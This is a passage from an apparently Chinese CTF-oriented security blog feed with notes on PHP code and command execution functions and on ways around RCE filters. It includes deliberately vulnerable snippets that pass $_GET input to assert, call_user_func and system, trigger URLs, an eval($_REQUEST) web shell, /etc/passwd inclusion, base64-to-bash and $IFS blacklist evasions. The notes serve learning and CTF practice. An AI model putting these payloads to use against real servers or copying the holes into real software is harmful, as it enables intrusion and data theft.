tag来离开、重新进入PHP模式</p><pre class="line-numbers language-php"><code class="language-php"><span class="token string">'echo "In PHP mode!"; ?>In HTML mode!&lt;?php echo "Back in PHP mode!";'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>assert()</p><ul><li><p>php5</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span><span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$description</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>php7</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span><span class="token punctuation">[</span><span class="token punctuation">,</span> Throwable <span class="token variable">$exception</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>http://localhost/demo.php?pass=phpinfo()</code></pre><p>phpinfo()后可以不用分号。得到phpinfo()页面。</p></li></ul></li><li><p>preg_replace</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span>     mixed <span class="token variable">$pattern</span><span class="token punctuation">,</span>     mixed <span class="token variable">$replacement</span><span class="token punctuation">,</span>     mixed <span class="token variable">$subject</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>     <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token operator">&amp;</span><span class="token variable">$count</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> mixed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以     <code>replacement</code> 进行替换。当使用被启用的e修饰符时，这个函数会转义一些字符（即：‘、”、\和NULL）然后进行后向引用替换。在完成替换后，引擎会将结果字符串作为PHP代码<strong>使用eval方式进行评估</strong>并将返回值作为最终参与替换的字符串</p></li></ul></li><li><p>call_user_func()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span>     callable <span class="token variable">$callback</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span> mixed <span class="token variable">$parameter</span>     <span class="token punctuation">[</span><span class="token punctuation">,</span> mixed $<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> mixed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。传入call_user_func()的参数不能为引用传递。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问</p><pre><code>http://localhost/demo.php?a=assert&amp;b=phpinfo()</code></pre></li></ul></li><li><p>call_user_func_array()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">call_user_func_array</span><span class="token punctuation">(</span>     callable <span class="token variable">$callback</span><span class="token punctuation">,</span>     <span class="token keyword">array</span> <span class="token variable">$param_arr</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> mixed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>访问</p><pre><code>http://localhost/demo.php?a=assert&amp;b[]=phpinfo()</code></pre></li></ul></li><li><p>create_function</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span>    string <span class="token variable">$args</span><span class="token punctuation">,</span>    string <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'kk'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a'</span><span class="token punctuation">,</span><span class="token string">"echo $a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问</p><pre><code>http://localhost/demo.php?kk=phpinfo();</code></pre></li></ul></li><li><p>array_map()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">array_map</span><span class="token punctuation">(</span>     callable <span class="token variable">$callback</span><span class="token punctuation">,</span>     <span class="token keyword">array</span> <span class="token variable">$array1</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">array</span> $<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">array</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$array</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'kk'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>访问</p><pre><code>http://localhost/demo.php?kk=phpinfo</code></pre><p>注意没有<code>()</code>和分号<code>;</code></p></li></ul></li></ul><h2 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h2><ul><li><p>system()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span>     string <span class="token variable">$command</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token operator">&amp;</span><span class="token variable">$return_var</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>command是要执行的命令。return_var，如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>passthru()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">passthru</span><span class="token punctuation">(</span>     string <span class="token variable">$command</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token operator">&amp;</span><span class="token variable">$return_var</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> void<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>同 <code>exec()</code>函数类似，<strong><code>passthru()</code></strong> 函数也是用来执行外部命令（<code>command</code>）的。当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代<code>exec()</code>或 <code>system()</code>函数。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>exec()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">exec</span><span class="token punctuation">(</span>     string <span class="token variable">$command</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token operator">&amp;</span><span class="token variable">$output</span>     <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token operator">&amp;</span><span class="token variable">$return_var</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>exec()</strong> 执行<code>command</code>参数所指定的命令。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>pcntl_exec()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">pcntl_exec</span><span class="token punctuation">(</span>     string <span class="token variable">$path</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$args</span>     <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$envs</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> void<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>path</code>是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本。</p><p><code>args</code>是一个要传递给程序的参数的字符串数组。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>shell_exec()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">shell_exec</span><span class="token punctuation">(</span> string <span class="token variable">$cmd</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>cmd是要执行的命令</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>popen()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">popen</span><span class="token punctuation">(</span>     string <span class="token variable">$command</span><span class="token punctuation">,</span>     string <span class="token variable">$mode</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> resource<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>打开一个指向进程的管道，该进程由派生给定的 <code>command</code> 命令执行而产生。后面的<code>mode</code>，当为’r’时，返回的文件指针等于命令的STDOUT，当为‘w’时,返回的文件指针等于命令的STDIN。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>proc_open()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">proc_open</span><span class="token punctuation">(</span>     string <span class="token variable">$cmd</span><span class="token punctuation">,</span>     <span class="token keyword">array</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span>     <span class="token keyword">array</span> <span class="token operator">&amp;</span><span class="token variable">$pipes</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span>string <span class="token variable">$cwd</span> <span class="token operator">=</span> <span class="token keyword">NULL</span>     <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$env</span> <span class="token operator">=</span> <span class="token keyword">NULL</span>      <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$other_options</span> <span class="token operator">=</span> <span class="token keyword">NULL</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> resource<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>类似 <a href="mk:@MSITStore:C:\Users\10429\Desktop\php_enhanced_zh.chm::/res/function.popen.html">popen()</a> 函数，但是 <strong>proc_open()</strong> 提供了更加强大的控制程序执行的能力。</p></li></ul></li><li><p><strong>`</strong>(反引号)</p><ul><li><p>在php中称之为执行运算符，PHP将尝试将反引号中的内容作为shell命令来执行，并将其输出信息返回（即可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数shell_exec()相同）。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> `whoami`<span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>ob_start()</p><ul><li><pre class="line-numbers language-php"><code class="language-php"><span class="token function">ob_start</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span> callback <span class="token variable">$output_callback</span>     <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token variable">$chunk_size</span>      <span class="token punctuation">[</span><span class="token punctuation">,</span> bool <span class="token variable">$erase</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p><p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被(  ob_flush(), ob_clean()  或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用  output_callback 时，它将收到输出缓冲区的内容作为参数  并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p><p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(<em>c<strong>m</strong>d</em>)中的<em>c<strong>m</strong>d</em>，把我们输入的_GET[a]作为cmd的参数。</p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string">'system'</span><span class="token punctuation">;</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"$_GET['a']"</span><span class="token punctuation">;</span>    <span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问</p><pre><code>http://localhost/demo.php?a=whoami</code></pre></li></ul></li><li><p>php mail()</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">mail</span><span class="token punctuation">(</span>     string <span class="token variable">$to</span><span class="token punctuation">,</span>     string <span class="token variable">$subject</span><span class="token punctuation">,</span>     string <span class="token variable">$message</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$additional_headers</span>    <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$additional_parameters</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项</p><ul><li>配置SMTP服务器的主机名和端口</li><li>配置PHP用作邮件传输代理(MTA)的文件路径</li></ul><p>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE Bypass</title>
      <link href="/2021/09/10/rce-bypass/"/>
      <url>/2021/09/10/rce-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE-Bypass"><a href="#RCE-Bypass" class="headerlink" title="RCE Bypass"></a>RCE Bypass</h1><p>参考<a href="https://blog.csdn.net/loseheart157/article/details/109305380" target="_blank" rel="noopener">RCE漏洞之绕过</a></p><h2 id="花括号"><a href="#花括号" class="headerlink" title="- 花括号"></a>- 花括号</h2><p><code>{}</code></p><p>在linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令</p><p><code>{cat,flag}</code></p><h2 id="反斜杠"><a href="#反斜杠" class="headerlink" title="- 反斜杠"></a>- 反斜杠</h2><p>路径<code>/</code></p><p>反斜杠<code>\</code>是在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。</p><p>也就意味着，我们可以在rce漏洞，过滤掉<code>cat</code>、<code>ls</code>等命令时，使用<code>ca\t</code>来实现绕过</p><h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="- 空格过滤"></a>- 空格过滤</h2><p><strong>注意:</strong>在使用带有<code>$</code>的内容替换时，要注意用<code>\</code>转义，因为<code>$</code>在php中有特殊含义</p><pre><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</code></pre><h2 id="一些命令分隔符"><a href="#一些命令分隔符" class="headerlink" title="- 一些命令分隔符"></a>- 一些命令分隔符</h2><p>linux中：<code>%0a</code>（回车）、<code>%0d</code>（换行）、<code>;</code>、<code>&amp;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code></p><p>windows中：<code>%0a</code>、<code>&amp;</code>、<code>|</code>、<code>%1a</code>（一个神奇的角色，作为<strong>.bat</strong>文件中的命令分隔符）</p><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="- 黑名单绕过"></a>- 黑名单绕过</h2><h3 id="–-变量拼接绕过"><a href="#–-变量拼接绕过" class="headerlink" title="– 变量拼接绕过"></a>– 变量拼接绕过</h3><p>例如：</p><pre class="line-numbers language-shell"><code class="language-shell">a=l;b=s;$a$b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用偶读拼接方法绕过黑名单：</p><pre class="line-numbers language-shell"><code class="language-shell">a=fl;b=ag;cat $a$b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用.拼接绕过<code>(sy.(st).em)</code></p><p>使用内敛执行代替system</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> `ls`<span class="token punctuation">;</span><span class="token keyword">echo</span> $<span class="token punctuation">(</span>ls<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span>`ls`<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span>$<span class="token punctuation">(</span>ls<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">&lt;?</span><span class="token operator">=</span>`ls <span class="token operator">/</span>`<span class="token punctuation">;</span><span class="token delimiter">?></span>   <span class="token shell-comment comment">#等效于&lt;?php echo `ls /`;?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="–-编码绕过"><a href="#–-编码绕过" class="headerlink" title="– 编码绕过"></a>– 编码绕过</h3><pre><code>echo "Y2F0IGZsYWc="|base64 -d|bash-d是解码，是base64解码xxd - r -p可以转换16进制，同样用户管道符之后。</code></pre><h3 id="–-单引号和双引号绕过"><a href="#–-单引号和双引号绕过" class="headerlink" title="– 单引号和双引号绕过"></a>– 单引号和双引号绕过</h3><pre class="line-numbers language-shell"><code class="language-shell">比如ca''t flag或cat""t flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="–-利用shell特殊变量绕过"><a href="#–-利用shell特殊变量绕过" class="headerlink" title="– 利用shell特殊变量绕过"></a>– 利用shell特殊变量绕过</h3><p>使用<code>$*</code>和<code>$@</code>，<code>$x</code>(x代表1-9)，<code>${x}</code>(x&gt;=10)。</p><p>PS：因为在没有传参的情况下，上面的特殊变量都是为空的</p><p>比如<code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></p><h3 id="–-linux中直接查看文件内容的工具"><a href="#–-linux中直接查看文件内容的工具" class="headerlink" title="– linux中直接查看文件内容的工具"></a>– linux中直接查看文件内容的工具</h3><pre><code> cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、cut、awkmore:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容</code></pre><p>假设该目录下有index.php和flag.php</p><pre class="line-numbers language-shell"><code class="language-shell">cat `ls`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等同于</p><pre class="line-numbers language-shell"><code class="language-shell">cat flag.php;cat index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cat新姿势/bin/?at</p><h3 id="–-文件构造"><a href="#–-文件构造" class="headerlink" title="– 文件构造"></a>– 文件构造</h3><p>在ctfhub文件包含中，有一个shell,txt,也就是文件<br>我们令?file = shell.txt，已知shell.txt内容为</p><!--?php eval($_REQUEST['ctfhub']);?--><p>request类型是由get和post构成的<br>在post数据里输入<br>ctfhub=system(“ls /“);<br>就可以执行命令.</p><h2 id="–-无需括号的函数"><a href="#–-无需括号的函数" class="headerlink" title="– 无需括号的函数"></a>– 无需括号的函数</h2><pre class="line-numbers language-php"><code class="language-php">```php<span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token number">666</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token number">666</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token keyword">include_once</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="–-过滤单引号和双引号"><a href="#–-过滤单引号和双引号" class="headerlink" title="– 过滤单引号和双引号"></a>– 过滤单引号和双引号</h2><p>$_GET[1]</p><p>$_POST[a]</p><p>此处为何参数不需要单引号或双引号也能用，不太清楚，但的确能用。</p><h2 id="–-无参数文件读取"><a href="#–-无参数文件读取" class="headerlink" title="– 无参数文件读取"></a>– 无参数文件读取</h2><blockquote><p>参考</p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>利用超全局变量进行bypass,进行RCE</li><li>进行任意文件读取</li></ol><h3 id="法一：localeconv"><a href="#法一：localeconv" class="headerlink" title="法一：localeconv()"></a>法一：localeconv()</h3><ul><li><p>highlight_file()</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518200944707.png" alt="image-20210518200944707"></p></li><li><p>此函数用来获取<code>.</code>，在windows及linux中均表示当前目录</p><p>localeconv()函数返回包含本地数字及货币格式信息的数组</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518174614995.png" alt="image-20210518174614995"></p></li><li><p>scandir()函数用来列出指定路径中的文件和目录</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518165817130.png" alt="image-20210518165817130"></p></li><li><p>current()函数返回数组中的当前元素(单元)，默认取第一个值</p></li><li><p>pos()同current()，是current()的别名</p></li><li><p>reset()函数返回数组第一个单元的值，如果数组为空则返回FALSE</p><p>构造如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="法二（待完善）-getenv"><a href="#法二（待完善）-getenv" class="headerlink" title="法二（待完善）:getenv()"></a>法二（待完善）:getenv()</h3><p><strong>注意</strong>：貌似只有php7.1.0才行，在docker中试了一下php5.6，提示getenv()需要提供参数<img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518190014039.png" alt="image-20210518190014039"><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518185825681.png" alt="image-20210518185825681"></p><p>php常见超全局变量</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$GLOBALS</span><span class="token variable">$_SERVER</span><span class="token variable">$_GET</span><span class="token variable">$_POST</span><span class="token variable">$_FILES</span><span class="token 